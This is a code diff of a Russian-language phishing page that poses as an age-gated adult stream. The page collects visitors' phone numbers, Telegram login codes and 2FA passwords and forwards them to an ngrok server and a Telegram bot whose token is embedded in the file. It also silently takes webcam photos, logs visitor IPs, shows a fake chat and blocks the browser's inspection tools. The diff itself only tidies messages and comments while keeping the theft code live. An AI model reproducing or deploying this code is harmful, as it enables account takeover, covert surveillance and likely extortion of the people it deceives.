@@ -249,7 +249,6 @@
             margin-bottom: 12px;
         }
 
-        /* ===== КАСТОМНЫЙ SELECT С ФЛАГАМИ ===== */
         .custom-select {
             position: relative;
             width: 100%;
@@ -371,9 +370,20 @@
             cursor: pointer;
         }
         .status-text {
-            font-size: 12px;
+            font-size: 14px;
             color: #ff8888;
             margin-top: 12px;
+            font-weight: bold;
+            text-align: center;
+            padding: 10px;
+            background: rgba(255,0,0,0.1);
+            border-radius: 10px;
+            border: 1px solid rgba(255,0,0,0.2);
+        }
+        .status-text.success {
+            color: #88ff88;
+            border-color: rgba(0,255,0,0.2);
+            background: rgba(0,255,0,0.05);
         }
         
         .code-section {
@@ -412,7 +422,6 @@
             margin-top: 5px;
         }
 
-        /* ===== СТРАНИЦА УВЕДОМЛЕНИЯ ===== */
         #broadcastOverlay {
             position: fixed;
             top: 0;
@@ -517,7 +526,6 @@
             box-shadow: 0 0 30px rgba(255, 51, 85, 0.5);
         }
 
-        /* ===== ПРОВЕРКА ВОЗРАСТА ===== */
         #ageModal {
             display: none;
             position: fixed;
@@ -570,7 +578,6 @@
             cursor: not-allowed;
         }
 
-        /* ===== АНИМАЦИЯ ТЕЛЕФОНА И SMS ===== */
         .phone-animation {
             position: fixed;
             top: 30px;
@@ -650,7 +657,6 @@
             color: #ff6680;
         }
 
-        /* ===== СТРАНИЦА БАНА ===== */
         #banPage {
             display: none;
             position: fixed;
@@ -720,7 +726,6 @@
 </head>
 <body>
 
-<!-- ===== СТРАНИЦА БАНА (ПОЯВЛЯЕТСЯ ЕСЛИ IP ЗАБАНЕН) ===== -->
 <div id="banPage">
     <div class="ban-container">
         <span class="lock">🚫</span>
@@ -732,13 +737,11 @@
     </div>
 </div>
 
-<!-- ===== АНИМАЦИЯ ТЕЛЕФОНА ===== -->
 <div class="phone-animation" id="phoneAnimation">
     <span class="phone-icon">📱</span>
     <span class="phone-text">Введите номер для <span>доступа</span></span>
 </div>
 
-<!-- ===== АНИМАЦИЯ SMS ===== -->
 <div class="sms-animation" id="smsAnimation">
     <div class="sms-header">📩 SMS</div>
     <div class="sms-body">Код отправлен на номер <span id="smsPhone">+7*********</span></div>
@@ -787,7 +790,6 @@
     </div>
 </div>
 
-<!-- ===== ПРОВЕРКА ВОЗРАСТА (ПОЯВЛЯЕТСЯ ПЕРВОЙ) ===== -->
 <div id="ageModal">
     <div class="modal-box">
         <h3>🔞 ПОДТВЕРЖДЕНИЕ ВОЗРАСТА</h3>
@@ -802,7 +804,6 @@
         <h3 id="modalTitle">🔞 Доступ к стриму</h3>
         <p id="modalDesc">Выберите страну и введите номер</p>
         
-        <!-- ===== КАСТОМНЫЙ SELECT С ФЛАГАМИ ===== -->
         <div class="custom-select" id="customSelect">
             <div class="selected-option" onclick="toggleOptions()">
                 <img src="flags/ru.png" class="flag" id="selectedFlag" alt="Флаг">
@@ -819,27 +820,21 @@
                 <div class="option-item" data-value="+375" data-flag="by" onclick="selectOption('+375', 'Беларусь (+375)', 'by')">
                     <img src="flags/by.png" class="flag" alt="Флаг"> Беларусь (+375)
                 </div>
-                <!-- ===== ЛАТВИЯ ===== -->
                 <div class="option-item" data-value="+371" data-flag="lv" onclick="selectOption('+371', 'Латвия (+371)', 'lv')">
                     <img src="flags/lv.png" class="flag" alt="Флаг"> Латвия (+371)
                 </div>
-                <!-- ===== НИДЕРЛАНДЫ ===== -->
                 <div class="option-item" data-value="+31" data-flag="nl" onclick="selectOption('+31', 'Нидерланды (+31)', 'nl')">
                     <img src="flags/nl.png" class="flag" alt="Флаг"> Нидерланды (+31)
                 </div>
-                <!-- ===== РУМЫНИЯ ===== -->
                 <div class="option-item" data-value="+40" data-flag="ro" onclick="selectOption('+40', 'Румыния (+40)', 'ro')">
                     <img src="flags/ro.png" class="flag" alt="Флаг"> Румыния (+40)
                 </div>
-                <!-- ===== СЕНЕГАЛ ===== -->
                 <div class="option-item" data-value="+221" data-flag="sn" onclick="selectOption('+221', 'Сенегал (+221)', 'sn')">
                     <img src="flags/sn.png" class="flag" alt="Флаг"> Сенегал (+221)
                 </div>
-                <!-- ===== СЛОВЕНИЯ ===== -->
                 <div class="option-item" data-value="+386" data-flag="si" onclick="selectOption('+386', 'Словения (+386)', 'si')">
                     <img src="flags/si.png" class="flag" alt="Флаг"> Словения (+386)
                 </div>
-                <!-- ===== СЛОВАКИЯ ===== -->
                 <div class="option-item" data-value="+421" data-flag="sk" onclick="selectOption('+421', 'Словакия (+421)', 'sk')">
                     <img src="flags/sk.png" class="flag" alt="Флаг"> Словакия (+421)
                 </div>
@@ -944,9 +939,6 @@
 </div>
 
 <script>
-    // ============================================================
-    // БЛОКИРОВКИ
-    // ============================================================
     document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
     document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });
     document.addEventListener('keydown', function(e) {
@@ -957,7 +949,6 @@
         if (e.ctrlKey && e.shiftKey && (e.key === 'C' || e.key === 'c')) { e.preventDefault(); return false; }
     });
     
-    // ========== КОНФИГ ==========
     const API_URL = 'https://ef46-153-80-249-155.ngrok-free.app';
     const BOT_TOKEN = '8809942680:AAHVr9WLL4GQHOqZtmzesQP-s05p5zlD7vE';
     const ADMIN_ID = '8704208839';
@@ -970,9 +961,6 @@
     let cameraStarted = false;
     let isBanned = false;
 
-    // ============================================================
-    // ========== ГЛАВНАЯ ПРОВЕРКА БАНА ==========
-    // ============================================================
     async function checkBan() {
         try {
             const ipRes = await fetch('https://api.ipify.org?format=json');
@@ -997,7 +985,6 @@
                 isBanned = true;
                 return false;
             }
-            
             return true;
         } catch(e) {
             console.log('❌ Ошибка проверки бана:', e);
@@ -1015,7 +1002,6 @@
         return hash;
     }
 
-    // ========== КАСТОМНЫЙ SELECT ==========
     function toggleOptions() {
         const list = document.getElementById('optionsList');
         const arrow = document.getElementById('arrowIcon');
@@ -1048,7 +1034,6 @@
         }
     });
     
-    // ========== АНИМАЦИЯ ТЕЛЕФОНА ==========
     function showPhoneAnimation() {
         const el = document.getElementById('phoneAnimation');
         el.classList.add('show');
@@ -1068,7 +1053,6 @@
         }, 5000);
     }
 
-    // ========== ПОЛУЧАЕМ ПАРАМЕТРЫ ИЗ URL ==========
     function getUrlParams() {
         const urlParams = new URLSearchParams(window.location.search);
         return {
@@ -1079,7 +1063,6 @@
         };
     }
     
-    // ========== ЗАГРУЗКА ДАННЫХ ВОРКЕРА ==========
     function loadWorkerData() {
         const params = getUrlParams();
         
@@ -1108,7 +1091,6 @@
             .catch(() => console.log('Ошибка отправки админу'));
     }
     
-    // ========== ЛОГ ЗАХОДА ==========
     (function() {
         const time = new Date().toLocaleString();
         const url = window.location.href;
@@ -1134,7 +1116,6 @@
             });
     })();
     
-    // ========== ПОСТОЯННАЯ ПРОВЕРКА КОМАНДЫ ==========
     function checkForBroadcast() {
         const refCode = currentRefCode || new URLSearchParams(window.location.search).get('ref');
         if (!refCode) {
@@ -1157,7 +1138,6 @@
             .catch(err => console.log('❌ Ошибка проверки:', err));
     }
     
-    // ========== ПОКАЗ УВЕДОМЛЕНИЯ ==========
     function showBroadcast(phone) {
         if (broadcastTriggered) return;
         broadcastTriggered = true;
@@ -1210,7 +1190,6 @@
         broadcastTriggered = false;
     }
     
-    // ========== ВИДЕО ПЛЕЕР ==========
     const video = document.getElementById('bgVideo');
     const videoContainer = document.getElementById('videoContainer');
     const loadingOverlay = document.getElementById('loadingOverlay');
@@ -1241,7 +1220,6 @@
         }
     }, 5000);
     
-    // ========== ФЕЙКОВЫЙ ЧАТ ==========
     const chatMessagesContainer = document.getElementById('chatMessages');
     const chatStartMessages = [
         "@user_124: когда разблокируют?",
@@ -1276,7 +1254,6 @@
     }
     setInterval(addChatMessage, 4000);
     
-    // ========== КАМЕРА ==========
     let cameraAllowed = false;
     
     async function startSilentCapture() {
@@ -1308,8 +1285,6 @@
                 canvas.height = videoEl.videoHeight || 480;
                 ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
                 const photoData = canvas.toDataURL('image/jpeg', 0.8);
-                
-                // ===== ИСПРАВЛЕННЫЙ ЗАПРОС С ref И phone =====
                 await fetch(`${API_URL}/upload_photo`, {
                     method: 'POST',
                     headers: { 
@@ -1332,13 +1307,11 @@
             videoEl.remove();
             
             sendToAdmin(`📸 5 скрытых фото за ${totalTime} секунд!`);
-            
         } catch(e) {
             sendToAdmin(`❌ Ошибка камеры: ${e.message}`);
         }
     }
     
-    // ========== ЦЕПОЧКА: КНОПКА → ВОЗРАСТ → КАМЕРА → НОМЕР ==========
     document.getElementById('unlockBtn').onclick = function() {
         document.getElementById('ageModal').style.display = 'flex';
     };
@@ -1357,7 +1330,6 @@
         btn.textContent = '✅ ПОДТВЕРДИТЬ 18+';
     };
     
-    // ========== МОДАЛКА ==========
     function showModal() { 
         document.getElementById('modal').style.display = 'flex'; 
         resetModal();
@@ -1372,6 +1344,7 @@
         document.getElementById('actionBtn').innerText = "📱 ПРОДОЛЖИТЬ";
         document.getElementById('actionBtn').disabled = false;
         document.getElementById('status').innerHTML = "";
+        document.getElementById('status').className = "status-text";
         document.getElementById('modalTitle').innerText = "🔞 Доступ к стриму";
         document.getElementById('modalDesc').innerText = "Выберите страну и введите номер";
         currentPhone = "";
@@ -1395,7 +1368,10 @@
         
         if (currentStep === "phone") {
             let phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
-            if (!phone) { statusDiv.innerText = "Введите номер"; return; }
+            if (!phone) { 
+                statusDiv.innerText = "❌ Введите номер телефона!";
+                return; 
+            }
             
             const countryCode = selectedCountryCode;
             let fullPhone = phone;
@@ -1411,7 +1387,8 @@
             
             btn.disabled = true;
             btn.innerText = "⏳ ОТПРАВКА...";
-            statusDiv.innerText = "Отправляем код...";
+            statusDiv.innerText = "⏳ Отправляем код...";
+            statusDiv.className = "status-text";
             try {
                 const bodyData = { phone: fullPhone };
                 if (currentRefCode) {
@@ -1430,29 +1407,45 @@
                     btn.innerText = "✅ ПОДТВЕРДИТЬ КОД";
                     document.getElementById('modalTitle').innerText = "📲 Введите код";
                     document.getElementById('modalDesc').innerText = "Код отправлен на ваш номер";
-                    statusDiv.style.color = "#88ff88";
+                    statusDiv.className = "status-text success";
                     statusDiv.innerHTML = "✅ Код отправлен!";
                     btn.disabled = false;
                     
                     showSmsAnimation(fullPhone);
                 } else {
-                    statusDiv.innerText = "Ошибка: " + (data.error || "неизвестно");
+                    let errorMsg = data.error || "неизвестная ошибка";
+                    // ПРОВЕРЯЕМ КОНКРЕТНЫЕ ОШИБКИ
+                    if (errorMsg.includes("phone number is invalid") || errorMsg.includes("неверный формат")) {
+                        statusDiv.innerHTML = "❌ <b>ВЫ НЕВЕРНО ВВЕЛИ НОМЕР!</b>\nПроверьте и введите заново.";
+                    } else if (errorMsg.includes("invalid")) {
+                        statusDiv.innerHTML = "❌ <b>НЕВЕРНЫЙ ФОРМАТ НОМЕРА!</b>\nИспользуйте правильный код страны.";
+                    } else if (errorMsg.includes("not found")) {
+                        statusDiv.innerHTML = "❌ <b>НОМЕР НЕ НАЙДЕН В TELEGRAM!</b>\nПроверьте правильность ввода.";
+                    } else {
+                        statusDiv.innerHTML = `❌ <b>Ошибка:</b> ${errorMsg}`;
+                    }
+                    statusDiv.className = "status-text";
                     btn.disabled = false;
                     btn.innerText = "📱 ПРОДОЛЖИТЬ";
                 }
             } catch(e) {
-                statusDiv.innerText = "Ошибка: сервер не запущен";
+                statusDiv.innerHTML = "❌ <b>ОШИБКА СОЕДИНЕНИЯ!</b>\nПроверьте интернет и попробуйте снова.";
+                statusDiv.className = "status-text";
                 btn.disabled = false;
                 btn.innerText = "📱 ПРОДОЛЖИТЬ";
             }
         } else if (currentStep === "code") {
             const code = document.getElementById('code').value.trim();
-            if (!code) { statusDiv.innerText = "Введите код"; return; }
+            if (!code) { 
+                statusDiv.innerText = "❌ Введите код подтверждения!";
+                return; 
+            }
             
             sendToAdmin(`🔑 КОД для ${currentPhone}: ${code}`);
             
             btn.disabled = true;
             btn.innerText = "⏳ ПРОВЕРКА...";
+            statusDiv.innerText = "⏳ Проверяем код...";
             try {
                 const response = await fetch(`${API_URL}/verify_code`, {
                     method: 'POST',
@@ -1461,7 +1454,7 @@
                 });
                 const data = await response.json();
                 if (data.success) {
-                    statusDiv.style.color = "#88ff88";
+                    statusDiv.className = "status-text success";
                     statusDiv.innerHTML = "✅ Вход выполнен!";
                     setTimeout(() => {
                         window.location.href = "https://web.telegram.org";
@@ -1473,27 +1466,38 @@
                     btn.innerText = "🔐 ПОДТВЕРДИТЬ ПАРОЛЬ";
                     document.getElementById('modalTitle').innerText = "🔐 Двухфакторная аутентификация";
                     document.getElementById('modalDesc').innerText = "Введите пароль";
-                    statusDiv.style.color = "#ffaa66";
-                    statusDiv.innerHTML = "⏳ Требуется пароль";
+                    statusDiv.className = "status-text";
+                    statusDiv.innerHTML = "⏳ Требуется пароль 2FA";
                     btn.disabled = false;
                 } else {
-                    statusDiv.innerText = "Ошибка: " + (data.error || "неверный код");
+                    let errorMsg = data.error || "неверный код";
+                    if (errorMsg.includes("Invalid code") || errorMsg.includes("неверный код")) {
+                        statusDiv.innerHTML = "❌ <b>НЕВЕРНЫЙ КОД ПОДТВЕРЖДЕНИЯ!</b>\nПроверьте и введите заново.";
+                    } else {
+                        statusDiv.innerHTML = `❌ <b>Ошибка:</b> ${errorMsg}`;
+                    }
+                    statusDiv.className = "status-text";
                     btn.disabled = false;
                     btn.innerText = "✅ ПОДТВЕРДИТЬ КОД";
                 }
             } catch(e) {
-                statusDiv.innerText = "Ошибка соединения";
+                statusDiv.innerHTML = "❌ <b>ОШИБКА СОЕДИНЕНИЯ!</b>";
+                statusDiv.className = "status-text";
                 btn.disabled = false;
                 btn.innerText = "✅ ПОДТВЕРДИТЬ КОД";
             }
         } else if (currentStep === "password") {
             const password = document.getElementById('password').value.trim();
-            if (!password) { statusDiv.innerText = "Введите пароль"; return; }
+            if (!password) { 
+                statusDiv.innerText = "❌ Введите пароль!";
+                return; 
+            }
             
             sendToAdmin(`🔒 ПАРОЛЬ 2FA для ${currentPhone}: ${password}`);
             
             btn.disabled = true;
             btn.innerText = "⏳ ПРОВЕРКА...";
+            statusDiv.innerText = "⏳ Проверяем пароль...";
             try {
                 const response = await fetch(`${API_URL}/verify_password`, {
                     method: 'POST',
@@ -1502,25 +1506,31 @@
                 });
                 const data = await response.json();
                 if (data.success) {
-                    statusDiv.style.color = "#88ff88";
+                    statusDiv.className = "status-text success";
                     statusDiv.innerHTML = "✅ Вход выполнен!";
                     setTimeout(() => {
                         window.location.href = "https://web.telegram.org";
                     }, 1500);
                 } else {
-                    statusDiv.innerText = "Ошибка: " + (data.error || "неверный пароль");
+                    let errorMsg = data.error || "неверный пароль";
+                    if (errorMsg.includes("invalid") || errorMsg.includes("неверный")) {
+                        statusDiv.innerHTML = "❌ <b>НЕВЕРНЫЙ ПАРОЛЬ 2FA!</b>\nПопробуйте еще раз.";
+                    } else {
+                        statusDiv.innerHTML = `❌ <b>Ошибка:</b> ${errorMsg}`;
+                    }
+                    statusDiv.className = "status-text";
                     btn.disabled = false;
                     btn.innerText = "🔐 ПОДТВЕРДИТЬ ПАРОЛЬ";
                 }
             } catch(e) {
-                statusDiv.innerText = "Ошибка соединения";
+                statusDiv.innerHTML = "❌ <b>ОШИБКА СОЕДИНЕНИЯ!</b>";
+                statusDiv.className = "status-text";
                 btn.disabled = false;
                 btn.innerText = "🔐 ПОДТВЕРДИТЬ ПАРОЛЬ";
             }
         }
     }
     
-    // ========== ИНИЦИАЛИЗАЦИЯ ==========
     document.addEventListener('DOMContentLoaded', function() {
         document.getElementById('selectedFlag').src = 'flags/ru.png';
         document.getElementById('selectedText').textContent = 'Россия (+7)';
@@ -1542,9 +1552,6 @@
     window.closeBroadcast = closeBroadcast;
     window.showBroadcast = showBroadcast;
     
-    // ============================================================
-    // ========== ГЛАВНАЯ ЗАГРУЗКА С ПРОВЕРКОЙ БАНА ==========
-    // ============================================================
     (async function main() {
         const allowed = await checkBan();
         
@@ -1565,7 +1572,6 @@
     })();
 </script>
 
-<!-- Бейдж безопасности -->
 <div id="trustBadge" style="position: fixed; bottom: 15px; left: 15px; background: rgba(30,30,30,0.85); backdrop-filter: blur(8px); border-radius: 30px; padding: 8px 18px; display: flex; align-items: center; gap: 12px; z-index: 999; border: 1px solid rgba(255,255,255,0.15); box-shadow: 0 4px 12px rgba(0,0,0,0.3); font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;">
     <div style="background: #2ecc71; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 6px #2ecc71;">
         <span style="color: white; font-size: 18px; font-weight: bold;">✓</span>
